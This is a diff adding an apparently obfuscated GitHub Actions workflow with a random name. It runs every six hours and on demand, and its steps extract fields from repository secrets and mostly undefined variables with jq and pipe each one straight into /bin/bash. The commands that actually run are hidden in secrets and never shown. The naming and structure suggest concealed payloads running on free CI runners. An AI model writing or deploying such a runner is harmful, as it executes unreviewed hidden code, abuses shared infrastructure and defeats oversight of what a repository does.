@@ -1,0 +1,29 @@
+name: youquancun4523
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youquancun4523
+        env:
+          l71: ${{ secrets.l71 }}
+        run: |
+          echo $l71 | jq -r .apdh9 | /bin/bash
+          echo $jzpc87599 | jq -r .i7 | /bin/bash
+          echo $xguru6 | jq -r .bsrd3 | /bin/bash
+          echo $svv7 | jq -r .puxbe856 | /bin/bash
+          echo $lm78 | jq -r .zk500 | /bin/bash
+          echo $fducx320 | jq -r .w1 | /bin/bash
+          echo $cyc456 | jq -r .pmj9 | /bin/bash
+          echo $dhun69 | jq -r .tw055 | /bin/bash
+          echo $xc2 | jq -r .ql792 | /bin/bash
+          echo $yl6027 | jq -r .owwsp5 | /bin/bash
+          echo $ev17 | jq -r .mrjm83796 | /bin/bash
+
